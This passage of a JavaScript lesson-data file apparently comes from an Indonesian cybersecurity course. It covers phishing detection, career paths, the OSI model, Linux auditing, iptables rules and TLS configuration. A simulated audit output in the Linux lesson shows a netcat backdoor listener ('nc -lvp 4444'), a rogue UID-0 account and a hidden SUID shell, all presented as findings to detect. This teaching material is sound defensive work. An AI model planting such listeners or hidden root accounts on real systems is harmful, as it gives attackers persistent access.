VERDICT: [PHISHING / LEGITIMATE]
TINDAKAN: `,
        editorTask: 'Analisis email di atas dan identifikasi semua tanda-tanda phishing. Tulis tindakan yang harus dilakukan.',
        terminalSim: `[analyst@seclab ~]$ python3 phishing_analyzer.py email.eml

=== PHISHING ANALYZER v2.1 ===
Analyzing: email.eml

[*] Checking sender domain...
    From: it-support@company-helpdesk-verify.net
    Expected: @company.com
    Result: SUSPICIOUS ⚠️  Domain mismatch!

[*] Checking links in body...
    Found URL: http://company-reset-pw.xyz/login
    SSL: None (HTTP only!) — DANGEROUS!
    Domain age: 3 days — Very new, suspicious!
    Result: MALICIOUS ❌

[*] Analyzing language patterns...
    Urgency keywords: "URGENT", "TODAY", "expires"
    Threat keywords: "termination", "failure"
    Result: HIGH PRESSURE TACTICS ⚠️

[*] Checking request type...
    Requesting: username + current password
    Result: CREDENTIAL HARVESTING ❌

=== VERDICT: PHISHING EMAIL ===
Risk Level: CRITICAL
Recommended Action: DELETE & REPORT TO IT SECURITY
Do NOT click any links or provide credentials!`,
        quiz: {
          q: 'Apa yang membedakan Spear Phishing dari Phishing biasa?',
          options: ['Spear Phishing lebih murah', 'Spear Phishing ditargetkan ke individu/organisasi spesifik', 'Spear Phishing hanya melalui SMS', 'Spear Phishing lebih mudah dideteksi'],
          correct: 1,
          explanation: 'Spear Phishing adalah serangan phishing yang sangat ditargetkan — pelaku riset tentang korban secara mendalam sehingga email tampak sangat meyakinkan dan personal.',
        },
        challenge: {
          title: 'Buat Security Awareness Guide',
          desc: 'Buat panduan singkat untuk karyawan tentang cara mengenali dan menangani 3 jenis serangan: phishing, vishing, dan baiting. Sertakan tanda-tanda dan langkah tindakan.',
          starter: `# === Security Awareness Guide ===
# Untuk: Seluruh Karyawan

## 1. PHISHING (Email Palsu)
Tanda-tanda:
- 
- 
Tindakan:
- 

## 2. VISHING (Telepon Palsu)
Tanda-tanda:
- 
Tindakan:
- 

## 3. BAITING (Umpan Fisik)
Tanda-tanda:
- 
Tindakan:
- 

INGAT: Jika ragu, selalu hubungi IT Security!`,
          hint: 'Fokus pada tanda-tanda yang mudah dikenali dan tindakan yang sederhana untuk karyawan awam.',
        },
        xp: 45,
      },
      {
        id: 'l1t3', title: 'Profesi di Cyber Security', diff: 'beginner',
        filename: 'careers.md',
        explain: `
<h3>Karir di Cyber Security</h3>
<p>Cyber security menawarkan berbagai jalur karir dengan permintaan yang sangat tinggi di seluruh dunia.</p>
<h4>🗡️ Red Team (Offensive)</h4>
<ul>
  <li><strong>Penetration Tester</strong> — Melakukan simulasi serangan untuk menemukan celah</li>
  <li><strong>Ethical Hacker / Bug Hunter</strong> — Mencari dan melaporkan kerentanan</li>
  <li><strong>Red Team Operator</strong> — Simulasi serangan APT (Advanced Persistent Threat)</li>
  <li><strong>Exploit Developer</strong> — Membuat proof-of-concept untuk kerentanan</li>
</ul>
<h4>🛡️ Blue Team (Defensive)</h4>
<ul>
  <li><strong>SOC Analyst</strong> — Monitor dan respons insiden keamanan 24/7</li>
  <li><strong>Incident Responder</strong> — Investigasi dan penanganan ketika terjadi breach</li>
  <li><strong>Threat Hunter</strong> — Proaktif mencari ancaman yang sudah ada di sistem</li>
  <li><strong>Security Engineer</strong> — Membangun dan maintain infrastruktur keamanan</li>
</ul>
<h4>🟣 Purple Team & Spesialisasi</h4>
<ul>
  <li><strong>DFIR Analyst</strong> — Digital Forensics & Incident Response</li>
  <li><strong>Malware Analyst</strong> — Reverse engineering malware</li>
  <li><strong>Cloud Security Engineer</strong> — Keamanan infrastruktur cloud (AWS/Azure/GCP)</li>
  <li><strong>AppSec Engineer</strong> — Keamanan aplikasi (SAST/DAST/code review)</li>
  <li><strong>CISO</strong> — Chief Information Security Officer (eksekutif)</li>
</ul>
<div class="ct-tip-box">💡 <span>Mulai dari SOC Analyst atau entry-level pentesting. Dapatkan pengalaman 2-3 tahun, lalu spesialisasi. Gaji rata-rata security engineer di Indonesia Rp 15-50 juta/bulan!</span></div>
`,
        example: `# Career Roadmap Cyber Security

ENTRY LEVEL (0-2 tahun):
  → SOC Analyst Tier 1
  → IT Security Analyst  
  → Junior Penetration Tester
  
  Skill: CompTIA Security+, eJPT, TryHackMe, CEH
  Gaji: Rp 8-15 juta/bulan

MID LEVEL (2-5 tahun):
  → SOC Analyst Tier 2/3
  → Penetration Tester
  → Security Engineer
  → Incident Responder
  
  Skill: OSCP, CySA+, GCIH, Splunk Core
  Gaji: Rp 15-35 juta/bulan

SENIOR LEVEL (5+ tahun):
  → Red Team Lead
  → Threat Hunt Lead
  → Cloud Security Architect
  → Security Architect
  → CISO (Director level)
  
  Skill: CISSP, CISM, OSEP, OSED, Cloud certs
  Gaji: Rp 35-100+ juta/bulan`,
        editorStarter: `# === My Cyber Security Career Plan ===

TARGET ROLE: ________________
TARGET TIMELINE: ________________

CURRENT SKILLS:
- OS / Networking:
- Programming:
- Security tools:
- Certifications:

SKILLS TO LEARN (Prioritas):
1. 
2. 
3. 

LEARNING RESOURCES:
- Platform:
- Books:
- Labs:

CERTIFICATION ROADMAP:
Month 1-3: 
Month 4-6: 
Month 7-12: 

FIRST STEPS (THIS WEEK):
1. 
2. 
3. `,
        editorTask: 'Buat career plan personal kamu menuju profesi cyber security yang kamu inginkan. Spesifik dan realistis!',
        terminalSim: `[analyst@seclab ~]$ whoami --career-path

Loading career progression data...

RECOMMENDED PATH: SOC Analyst → Pentester → Security Engineer

PHASE 1: Foundation (0-6 bulan)
  [✓] Learn: Linux fundamentals
  [✓] Learn: Networking (TCP/IP, OSI)
  [ ] Get: CompTIA Security+ (target: 3 bulan)
  [ ] Platform: TryHackMe (Pre-Security path)

PHASE 2: Specialization (6-18 bulan)
  [ ] Get: eJPT / PNPT certification
  [ ] Get: CEH (optional)
  [ ] Platform: HackTheBox (Easy machines)
  [ ] Participate: CTF competitions

PHASE 3: Professional (18+ bulan)
  [ ] Get: OSCP (gold standard pentesting)
  [ ] Build: Bug bounty portfolio
  [ ] Target: First security job

Job Market Indonesia:
  Open positions: 1,247 (cybersecurity)
  Average salary: Rp 22,000,000/month
  Top hirers: Telkom, BRI, Tokopedia, Gojek, BSSN`,
        quiz: {
          q: 'Apa perbedaan utama antara Red Team dan Blue Team?',
          options: ['Red Team lebih mahal bayarannya', 'Red Team menyerang (offensive), Blue Team bertahan (defensive)', 'Red Team hanya kerja di pemerintahan', 'Tidak ada perbedaan, hanya nama berbeda'],
          correct: 1,
          explanation: 'Red Team berperan sebagai penyerang — melakukan penetration testing dan simulasi serangan. Blue Team berperan sebagai pembela — monitoring, deteksi, dan respons ancaman.',
        },
        challenge: {
          title: 'Job Description Analysis',
          desc: 'Analisis lowongan SOC Analyst berikut. Identifikasi: skill yang sudah kamu miliki, skill yang perlu dipelajari, dan estimasi waktu persiapan.',
          starter: `JOB: SOC Analyst Tier 1 — PT Bank Digital Indonesia
Requirements:
- S1 Teknik Informatika / Ilmu Komputer
- Memahami TCP/IP dan protokol jaringan
- Familiar dengan SIEM (Splunk, IBM QRadar)
- Mengetahui OWASP Top 10
- Pengalaman Linux command line
- Sertifikasi CompTIA Security+ (diutamakan)
- Bersedia shift (24/7 operations)

MY ANALYSIS:
Skills I have:
-

Skills I need to learn:
-

Estimated preparation time: __ months

First 3 steps to qualify:
1.
2.
3.`,
          hint: 'Jujur dengan diri sendiri tentang skill gap. Ini adalah langkah pertama membangun karir yang solid.',
        },
        xp: 35,
      },
    ]
  },
  {
    id: 2, name: 'Networking & Linux', icon: '🌐', color: '#60a5fa',
    topics: [
      {
        id: 'l2t1', title: 'Model OSI & TCP/IP', diff: 'beginner',
        filename: 'osi-model.md',
        explain: `
<h3>Model OSI & TCP/IP</h3>
<p>Memahami model jaringan adalah WAJIB untuk cyber security. Hampir semua serangan dan pertahanan bekerja pada layer tertentu.</p>
<h4>📚 7 Layer OSI</h4>
<ol>
  <li><strong>Physical</strong> — Kabel, sinyal listrik, Wi-Fi radio. Serangan: cable tapping, signal jamming.</li>
  <li><strong>Data Link</strong> — MAC address, switching. Serangan: ARP Spoofing, MAC flooding.</li>
  <li><strong>Network</strong> — IP address, routing. Serangan: IP spoofing, ICMP flood (ping of death).</li>
  <li><strong>Transport</strong> — TCP/UDP, ports. Serangan: SYN flood, port scanning.</li>
  <li><strong>Session</strong> — Sesi koneksi. Serangan: session hijacking.</li>
  <li><strong>Presentation</strong> — Enkripsi, format data. Serangan: SSL stripping.</li>
  <li><strong>Application</strong> — HTTP, DNS, FTP. Serangan: SQLi, XSS, DNS poisoning.</li>
</ol>
<div class="ct-tip-box">💡 <span>Hafal dengan: "Please Do Not Throw Sausage Pizza Away" (Physical, Data Link, Network, Transport, Session, Presentation, Application)</span></div>
<h4>📡 TCP/IP Model (4 Layer)</h4>
<ul>
  <li><strong>Network Access</strong> — Layer 1+2 OSI</li>
  <li><strong>Internet</strong> — Layer 3 OSI (IP)</li>
  <li><strong>Transport</strong> — Layer 4 OSI (TCP/UDP)</li>
  <li><strong>Application</strong> — Layer 5-7 OSI (HTTP, DNS, dll)</li>
</ul>
<h4>🔌 Port Penting yang Wajib Hafal</h4>
<ul>
  <li>21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS</li>
  <li>80 HTTP, 110 POP3, 143 IMAP, 443 HTTPS</li>
  <li>3306 MySQL, 3389 RDP, 8080 HTTP-alt</li>
</ul>
`,
        example: `# Wireshark — Capture & Filter Traffic
# Command-line equivalent menggunakan tcpdump

# Capture semua traffic di interface eth0
tcpdump -i eth0

# Capture hanya traffic HTTP (port 80)
tcpdump -i eth0 port 80

# Capture traffic dari IP tertentu
tcpdump -i eth0 host 192.168.1.100

# Capture dan simpan ke file
tcpdump -i eth0 -w capture.pcap

# Baca file pcap
tcpdump -r capture.pcap

# Filter: tampilkan hanya SYN packets (port scanning)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Wireshark filter equivalents:
# http               — tampilkan semua HTTP
# ip.addr == x.x.x.x  — filter IP address
# tcp.port == 443    — HTTPS traffic
# dns                — semua DNS queries`,
        editorStarter: `# === Network Analysis Lab ===
# Simulasi: Kamu menemukan traffic mencurigakan di jaringan
# Analisis packet berikut dan tentukan apakah ini serangan

CAPTURED PACKETS:
13:24:01 192.168.1.50 → 10.0.0.1  TCP SYN [port 22]
13:24:01 192.168.1.50 → 10.0.0.1  TCP SYN [port 23]
13:24:01 192.168.1.50 → 10.0.0.1  TCP SYN [port 80]
13:24:01 192.168.1.50 → 10.0.0.1  TCP SYN [port 443]
13:24:01 192.168.1.50 → 10.0.0.1  TCP SYN [port 3389]
13:24:01 192.168.1.50 → 10.0.0.1  TCP SYN [port 3306]
13:24:01 192.168.1.50 → 10.0.0.1  TCP SYN [port 8080]
(... 1000 port lainnya dalam 2 detik ...)

ANALISIS SAYA:
Jenis aktivitas: 
OSI Layer yang terlibat: 
Port yang di-scan: 
Alat yang mungkin digunakan: 
Apakah ini serangan? [ ] Ya  [ ] Tidak
Tindakan yang harus diambil: `,
        editorTask: 'Analisis pola traffic di atas. Tentukan jenis serangan, layer OSI, dan langkah mitigasi yang tepat.',
        terminalSim: `[analyst@seclab ~]$ nmap -sV 10.0.0.1

Starting Nmap scan...

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 8.2
80/tcp    open   http        Apache 2.4.41
443/tcp   open   ssl/https   Apache 2.4.41
3306/tcp  open   mysql       MySQL 8.0.27
3389/tcp  open   rdp         Microsoft RDP
8080/tcp  open   http-proxy  Nginx 1.18

⚠️  SECURITY FINDINGS:
  - Port 23 (Telnet): Closed ✓
  - RDP (3389) exposed publicly: RISK!
  - MySQL (3306) exposed publicly: CRITICAL!
  - Outdated Apache version: Patch needed

[analyst@seclab ~]$ # Port scanning detected from: 192.168.1.50
[analyst@seclab ~]$ # Initiating incident response...`,
        quiz: {
          q: 'Pada layer OSI berapa SQL Injection terjadi?',
          options: ['Layer 3 — Network', 'Layer 4 — Transport', 'Layer 7 — Application', 'Layer 2 — Data Link'],
          correct: 2,
          explanation: 'SQL Injection adalah serangan yang terjadi di Layer 7 (Application) karena menyerang aplikasi web melalui protokol HTTP/HTTPS.',
        },
        challenge: {
          title: 'Port Security Audit',
          desc: 'Buat laporan audit port untuk server web yang kamu kelola. Tentukan port mana yang harus dibuka, ditutup, atau dibatasi aksesnya, dan jelaskan alasannya.',
          starter: `# === Port Security Audit Report ===
# Server: Production Web Server
# IP: 203.x.x.x (Public)

PORT AUDIT:

Port 22 (SSH):   [OPEN/CLOSED/RESTRICTED] - Alasan:
Port 80 (HTTP):  [OPEN/CLOSED/RESTRICTED] - Alasan:
Port 443 (HTTPS):[OPEN/CLOSED/RESTRICTED] - Alasan:
Port 3306 (MySQL):[OPEN/CLOSED/RESTRICTED] - Alasan:
Port 3389 (RDP): [OPEN/CLOSED/RESTRICTED] - Alasan:
Port 8080:       [OPEN/CLOSED/RESTRICTED] - Alasan:

FIREWALL RULES (iptables):
# Tulis rules yang seharusnya diterapkan:

REKOMENDASI KEAMANAN:
1.
2.
3.`,
          hint: 'Prinsip least privilege: buka hanya port yang BENAR-BENAR dibutuhkan. Database tidak boleh expose ke publik!',
        },
        xp: 55,
      },
      {
        id: 'l2t2', title: 'Linux untuk Security', diff: 'beginner',
        filename: 'linux-security.sh',
        explain: `
<h3>Linux untuk Cyber Security</h3>
<p>Linux adalah sistem operasi utama untuk security tools dan server. Menguasai Linux adalah skill fundamental yang wajib dimiliki.</p>
<h4>📁 Filesystem Security</h4>
<ul>
  <li><code>/etc/passwd</code> — Daftar user system (tidak ada password di sini)</li>
  <li><code>/etc/shadow</code> — Hash password (hanya root yang bisa baca)</li>
  <li><code>/var/log/</code> — Log system (auth.log, syslog, dll)</li>
  <li><code>/tmp/</code> — Direktori sementara, sering dieksploitasi attacker</li>
  <li><code>/proc/</code> — Informasi proses yang berjalan</li>
</ul>
<h4>⚙️ Permission System</h4>
<p>Format: <code>-rwxrwxrwx</code> → Owner | Group | Others</p>
<ul>
  <li>r = read (4), w = write (2), x = execute (1)</li>
  <li><code>chmod 644 file</code> → rw-r--r-- (file biasa)</li>
  <li><code>chmod 755 script</code> → rwxr-xr-x (executable)</li>
  <li><code>chmod 600 key.pem</code> → rw------- (private key SSH)</li>
</ul>
<h4>🔒 Command Keamanan Penting</h4>
<ul>
  <li><code>sudo / su</code> — Elevasi privilege</li>
  <li><code>ss / netstat</code> — Lihat koneksi jaringan aktif</li>
  <li><code>ps aux</code> — Lihat semua proses yang berjalan</li>
  <li><code>grep / awk / sed</code> — Analisis log</li>
  <li><code>find</code> — Cari file dengan kriteria tertentu</li>
</ul>
<div class="ct-danger-box">⛔ <span>Jangan jalankan perintah sebagai root kecuali benar-benar diperlukan! Prinsip Least Privilege berlaku untuk semua user, termasuk admin.</span></div>
`,
        example: `#!/bin/bash
# === Linux Security Hardening Checklist ===

echo "=== Checking System Security ==="

# 1. Cek user dengan UID 0 (root privileges)
echo "[*] Users with root (UID 0):"
awk -F: '$3==0 {print $1}' /etc/passwd

# 2. Cek file SUID yang berbahaya
echo "[*] SUID files (potential escalation vectors):"
find / -perm -4000 -type f 2>/dev/null

# 3. Cek port yang terbuka
echo "[*] Listening ports:"
ss -tlnp

# 4. Cek login gagal (brute force?)
echo "[*] Failed SSH logins (last 20):"
grep "Failed password" /var/log/auth.log | tail -20

# 5. Cek crontab (persistence mechanism)
echo "[*] Cron jobs:"
cat /etc/crontab
ls -la /etc/cron.*

# 6. Cek sudoers
echo "[*] Sudo permissions:"
cat /etc/sudoers | grep -v "^#"`,
        editorStarter: `#!/bin/bash
# === My Linux Security Audit Script ===
# Tugas: Lengkapi script audit keamanan ini

echo "=== SECURITY AUDIT: $(hostname) ==="
echo "Date: $(date)"
echo ""

# 1. Informasi Sistem
echo "--- SYSTEM INFO ---"
# Tulis command untuk: OS version, kernel, uptime


# 2. User Audit
echo "--- USER AUDIT ---"
# Cari user yang bisa login (shell bukan /bin/false)
# Cek apakah ada user selain root dengan UID 0


# 3. Network Audit  
echo "--- NETWORK AUDIT ---"
# Tampilkan semua port yang listening
# Tampilkan koneksi aktif


# 4. Process Audit
echo "--- SUSPICIOUS PROCESSES ---"
# Cari proses yang berjalan sebagai root
# Cari proses dengan network connection


# 5. File Permission Check
echo "--- DANGEROUS PERMISSIONS ---"
# Cari file dengan world-writable permission
# Cari SUID binaries`,
        editorTask: 'Lengkapi script audit keamanan Linux dengan command yang tepat untuk setiap bagian.',
        terminalSim: `[root@server ~]# bash security_audit.sh

=== SECURITY AUDIT: prod-server-01 ===
Date: Mon Jan 15 13:45:22 UTC 2024

--- SYSTEM INFO ---
OS: Ubuntu 22.04.3 LTS
Kernel: 5.15.0-91-generic
Uptime: 47 days, 3 hours

--- USER AUDIT ---
Users with login shell:
  root (uid=0) — ADMIN
  deploy (uid=1001) — Service account
  backdoor (uid=0) ⚠️  SUSPICIOUS! Another root user!

--- NETWORK AUDIT ---
Listening ports:
  0.0.0.0:22   ssh
  0.0.0.0:80   http
  0.0.0.0:443  https
  0.0.0.0:4444 ⚠️  UNKNOWN! Possible backdoor shell!

--- SUSPICIOUS PROCESSES ---
PID 3841: nc -lvp 4444  ← NETCAT LISTENER! Backdoor!

--- DANGEROUS PERMISSIONS ---
/tmp/.hidden_shell  SUID root — CRITICAL!

RECOMMENDATION: SYSTEM COMPROMISED! Initiate IR immediately!`,
        quiz: {
          q: 'Perintah apa yang digunakan untuk melihat semua port yang sedang listening di Linux?',
          options: ['ps aux', 'ls -la /etc', 'ss -tlnp atau netstat -tlnp', 'cat /etc/hosts'],
          correct: 2,
          explanation: 'ss -tlnp (atau netstat -tlnp pada sistem lama) menampilkan semua TCP ports yang sedang listening beserta program yang menggunakannya.',
        },
        challenge: {
          title: 'Incident Response — Linux',
          desc: 'Server produksi menunjukkan perilaku mencurigakan: CPU 100%, ada koneksi keluar ke IP asing. Tulis urutan command yang akan kamu jalankan untuk investigasi awal.',
          starter: `# === Incident Response — Initial Triage ===
# Situasi: Server prod menunjukkan anomali

# STEP 1: Identifikasi proses mencurigakan
# Command:

# STEP 2: Cek koneksi jaringan keluar
# Command:

# STEP 3: Cek user yang sedang login
# Command:

# STEP 4: Cek log auth untuk login mencurigakan
# Command:

# STEP 5: Cek scheduled tasks (persistence)
# Command:

# STEP 6: Preserve evidence
# Command:

# KEPUTUSAN: Isolate server? [ ] Ya [ ] Tidak
# Alasan:`,
          hint: 'Urutan: w/who → ps aux → ss -anp → last → /var/log/auth.log → crontab. Jangan reboot dulu!',
        },
        xp: 60,
      },
    ]
  },
  {
    id: 3, name: 'Network Security', icon: '🔒', color: '#f7b96a',
    topics: [
      {
        id: 'l3t1', title: 'Firewall & IDS/IPS', diff: 'intermediate',
        filename: 'firewall.sh',
        explain: `
<h3>Firewall, IDS, dan IPS</h3>
<p>Trio pertahanan jaringan yang wajib dipahami setiap security engineer.</p>
<h4>🔥 Firewall</h4>
<p>Firewall memfilter traffic berdasarkan rules yang ditentukan.</p>
<ul>
  <li><strong>Packet Filtering</strong> — Filter berdasarkan IP, port, protokol</li>
  <li><strong>Stateful Inspection</strong> — Track state koneksi (lebih aman)</li>
  <li><strong>Next-Gen Firewall (NGFW)</strong> — Deep packet inspection, app awareness</li>
  <li><strong>WAF (Web Application Firewall)</strong> — Khusus untuk aplikasi web (SQLi, XSS)</li>
</ul>
<h4>🔍 IDS — Intrusion Detection System</h4>
<p>Mendeteksi dan MELAPORKAN aktivitas mencurigakan — tidak memblokir.</p>
<ul>
  <li><strong>NIDS</strong> — Network-based: monitor traffic jaringan (Snort, Suricata)</li>
  <li><strong>HIDS</strong> — Host-based: monitor aktivitas di satu mesin (OSSEC, Wazuh)</li>
  <li><strong>Signature-based</strong> — Bandingkan dengan database serangan yang diketahui</li>
  <li><strong>Anomaly-based</strong> — Deteksi perilaku yang tidak normal dari baseline</li>
</ul>
<h4>🚫 IPS — Intrusion Prevention System</h4>
<p>Seperti IDS tapi AKTIF memblokir serangan secara otomatis (inline).</p>
<div class="ct-warn-box">⚠️ <span>IPS yang tidak dikonfigurasi dengan baik bisa menyebabkan false positive — memblokir traffic yang sah (legitimate). Selalu test di environment staging dulu!</span></div>
`,
        example: `# === iptables Firewall Rules (Linux) ===

# Reset semua rules
iptables -F
iptables -X

# Default policy: DROP semua
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Izinkan loopback
iptables -A INPUT -i lo -j ACCEPT

# Izinkan koneksi yang sudah established
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Izinkan SSH hanya dari IP admin
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.10 -j ACCEPT

# Izinkan HTTP dan HTTPS publik
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Blokir port scan (too many new connections)
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Log semua yang di-DROP
iptables -A INPUT -j LOG --log-prefix "FW-DROP: "`,
        editorStarter: `# === Firewall Configuration Task ===
# Konfigurasi firewall untuk Web Application Server
# Requirements:
# - SSH hanya dari network admin (10.0.1.0/24)
# - HTTP dan HTTPS dari mana saja
# - Database (MySQL) hanya dari app server (10.0.2.5)
# - Blokir semua yang lain
# - Log semua DROP

# Reset existing rules
iptables -F

# Set default policies
# TODO: Set INPUT policy ke DROP
# TODO: Set FORWARD policy ke DROP
# TODO: Set OUTPUT policy ke ACCEPT

# Allow established connections
# TODO: 

# Allow loopback
# TODO:

# SSH dari admin network saja
# TODO:

# HTTP/HTTPS public access
# TODO:

# MySQL hanya dari app server
# TODO:

# Log and drop everything else
# TODO:`,
        editorTask: 'Lengkapi konfigurasi iptables sesuai requirements. Pastikan semua traffic yang tidak diizinkan di-DROP dan di-log.',
        terminalSim: `[root@firewall ~]# iptables -L -v -n

Chain INPUT (policy DROP 0 packets, 0 bytes)
target  prot  opt  source          destination
ACCEPT  all   --   anywhere        anywhere     state RELATED,ESTABLISHED
ACCEPT  all   --   anywhere        anywhere     lo
ACCEPT  tcp   --   10.0.1.0/24    anywhere     dpt:22
ACCEPT  tcp   --   anywhere       anywhere     dpt:80
ACCEPT  tcp   --   anywhere       anywhere     dpt:443
ACCEPT  tcp   --   10.0.2.5       anywhere     dpt:3306
LOG     all   --   anywhere       anywhere     LOG prefix="FW-DROP: "
DROP    all   --   anywhere       anywhere

[root@firewall ~]# tail -f /var/log/syslog | grep FW-DROP
Jan 15 14:30:01 FW-DROP: IN=eth0 SRC=185.220.101.5 DPT=22 — Blocked SSH brute force!
Jan 15 14:30:45 FW-DROP: IN=eth0 SRC=45.33.32.156 DPT=3306 — Blocked MySQL scan!`,
        quiz: {
          q: 'Apa perbedaan utama antara IDS dan IPS?',
          options: ['IDS lebih mahal dari IPS', 'IDS hanya mendeteksi, IPS juga memblokir secara aktif', 'IDS untuk network, IPS untuk host', 'Tidak ada perbedaan'],
          correct: 1,
          explanation: 'IDS (Intrusion Detection System) hanya mendeteksi dan melaporkan ancaman. IPS (Intrusion Prevention System) bekerja secara inline dan aktif memblokir traffic berbahaya secara otomatis.',
        },
        challenge: {
          title: 'DMZ Network Design',
          desc: 'Rancang arsitektur keamanan jaringan dengan DMZ (Demilitarized Zone) untuk perusahaan yang memiliki: web server, database server, dan workstation karyawan. Tulis firewall rules untuk setiap zona.',
          starter: `# === DMZ Network Security Design ===

TOPOLOGY:
Internet → [Outer Firewall] → DMZ → [Inner Firewall] → Internal Network

ZONES:
- Internet: 0.0.0.0/0 (untrusted)
- DMZ: 172.16.0.0/24 (semi-trusted)
  * Web Server: 172.16.0.10
- Internal: 192.168.0.0/24 (trusted)
  * Database: 192.168.0.20
  * Workstations: 192.168.0.50-100

OUTER FIREWALL RULES (Internet → DMZ):
Allow:
Deny:

INNER FIREWALL RULES (DMZ → Internal):
Allow:
Deny:

MONITORING:
- IDS placement:
- Log collection:
- Alert rules:`,
          hint: 'Web server di DMZ boleh diakses publik. Database HANYA dari web server. Workstation tidak boleh direct access dari internet.',
        },
        xp: 65,
      },
      {
        id: 'l3t2', title: 'VPN & Enkripsi Jaringan', diff: 'intermediate',
        filename: 'vpn-crypto.md',
        explain: `
<h3>VPN & Enkripsi Jaringan</h3>
<p>Enkripsi adalah tulang punggung keamanan komunikasi. Tanpa enkripsi, semua data di jaringan bisa dibaca siapa saja.</p>
<h4>🔐 Tipe Enkripsi</h4>
<ul>
  <li><strong>Symmetric</strong> — Satu kunci untuk enkripsi dan dekripsi. Cepat. Contoh: AES-256</li>
  <li><strong>Asymmetric</strong> — Public key untuk enkripsi, private key untuk dekripsi. Lebih lambat. Contoh: RSA-2048, ECC</li>
  <li><strong>Hashing</strong> — One-way, tidak bisa di-decrypt. Untuk verifikasi. Contoh: SHA-256, bcrypt</li>
</ul>
<h4>🌐 TLS/SSL — Enkripsi Web</h4>
<ul>
  <li>TLS 1.3 adalah versi terbaru dan paling aman (2023+)</li>
  <li>SSL sudah deprecated — jangan gunakan!</li>
  <li>Certificate Authority (CA) memverifikasi identitas server</li>
  <li>HSTS — paksa browser selalu gunakan HTTPS</li>
</ul>
<h4>🔒 VPN (Virtual Private Network)</h4>
<ul>
  <li><strong>Site-to-Site VPN</strong> — Menghubungkan dua kantor melalui internet terenkripsi</li>
  <li><strong>Remote Access VPN</strong> — Karyawan WFH bisa akses network kantor</li>
  <li><strong>Split Tunneling</strong> — Hanya traffic tertentu yang melalui VPN</li>
  <li>Protokol: OpenVPN, WireGuard (modern), IPSec, L2TP</li>
</ul>
<div class="ct-tip-box">💡 <span>WireGuard adalah protokol VPN modern yang lebih cepat dan lebih aman dari OpenVPN. Kodenya hanya 4.000 baris vs OpenVPN yang >400.000 baris — lebih kecil = attack surface lebih kecil!</span></div>
`,
        example: `# === Enkripsi Praktis di Linux ===

# 1. Generate RSA keypair (asymmetric)
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 2. Enkripsi file dengan public key
openssl rsautl -encrypt -inkey public.pem -pubin -in secret.txt -out secret.enc

# 3. Dekripsi dengan private key
openssl rsautl -decrypt -inkey private.pem -in secret.enc

# 4. Hash file dengan SHA-256
sha256sum important_file.iso
# Output: abc123... important_file.iso

# 5. Generate password hash (bcrypt equivalent)
openssl passwd -6 "MyPassword123"

# 6. Check TLS certificate
openssl s_client -connect google.com:443 | openssl x509 -noout -text

# 7. Test cipher suites yang didukung server
nmap --script ssl-enum-ciphers -p 443 target.com`,
        editorStarter: `# === Crypto Lab: Encrypt & Verify ===
# Simulasi mengamankan file konfigurasi sensitif

# SCENARIO:
# Kamu perlu mengirim file database credentials
# ke server baru secara aman melalui internet

# STEP 1: Generate encryption keys
# Buat RSA keypair 2048-bit untuk admin baru


# STEP 2: Buat file credentials (simulasi)
# Isi file db_credentials.txt dengan contoh konten sensitif


# STEP 3: Enkripsi file
# Enkripsi db_credentials.txt menggunakan public key


# STEP 4: Verifikasi integritas dengan hash
# Buat SHA-256 hash dari file yang dienkripsi


# STEP 5: Kirim dengan aman
# Apa yang harus dikirim? Apa yang harus TIDAK dikirim?
# - Kirim:
# - JANGAN kirim:

# STEP 6: Dekripsi di sisi penerima
# Penerima mendekripsi dengan private key mereka`,
        editorTask: 'Tulis command lengkap untuk setiap langkah pengiriman file credentials secara aman. Jelaskan alasan setiap langkah.',
        terminalSim: `[analyst@seclab ~]$ # Checking TLS configuration of web server

[analyst@seclab ~]$ nmap --script ssl-enum-ciphers -p 443 example.com

PORT    STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   TLSv1.0:
|     ciphers:
|       TLS_RSA_WITH_RC4_128_SHA  ← WEAK! RC4 broken!
|       TLS_RSA_WITH_3DES         ← WEAK! 3DES deprecated!
|   TLSv1.1:
|     ciphers: (similar weak ciphers)
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384  ← Strong ✓
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256  ← Strong ✓

ISSUES FOUND:
  ❌ TLSv1.0 enabled — disable immediately!
  ❌ TLSv1.1 enabled — disable immediately!
  ❌ RC4 cipher suite enabled — vulnerable!
  ✓  TLSv1.2 strong ciphers available

RECOMMENDATION:
  Disable TLSv1.0, TLSv1.1
  Disable RC4 and 3DES cipher suites
  Enable TLSv1.3 only with strong ciphers
  Enable HSTS with min 1 year`,
        quiz: {
          q: 'Mengapa kita menggunakan hashing (SHA-256) untuk password daripada enkripsi biasa?',
          options: ['Hashing lebih cepat dari enkripsi', 'Hash adalah one-way — tidak bisa di-reverse ke password asli', 'SHA-256 lebih murah lisensinya', 'Enkripsi tidak bisa digunakan untuk password'],
          correct: 1,
          explanation: 'Hashing adalah fungsi one-way — tidak ada cara matematis untuk mendapatkan kembali data asli dari hash. Ini ideal untuk password: kita verifikasi dengan hash input, bukan decrypt password tersimpan.',
        },
        challenge: {
          title: 'SSL/TLS Security Audit',
          desc: 'Server web kamu menggunakan TLS. Buat checklist audit TLS dan tulis konfigurasi Nginx yang aman untuk production server.',
          starter: `# === TLS Security Audit & Configuration ===

# TLS AUDIT CHECKLIST:
[ ] TLSv1.0 dinonaktifkan
[ ] TLSv1.1 dinonaktifkan
[ ] TLSv1.2 dengan strong ciphers saja
[ ] TLSv1.3 diaktifkan
[ ] HSTS header aktif
[ ] Certificate valid dan belum expired
[ ] Certificate chain lengkap
[ ] OCSP Stapling aktif

# NGINX TLS CONFIGURATION:
# Tulis konfigurasi nginx.conf yang aman:

server {
    listen 443 ssl;
    server_name example.com;
    
    # Certificate
    ssl_certificate /etc/ssl/certs/example.crt;
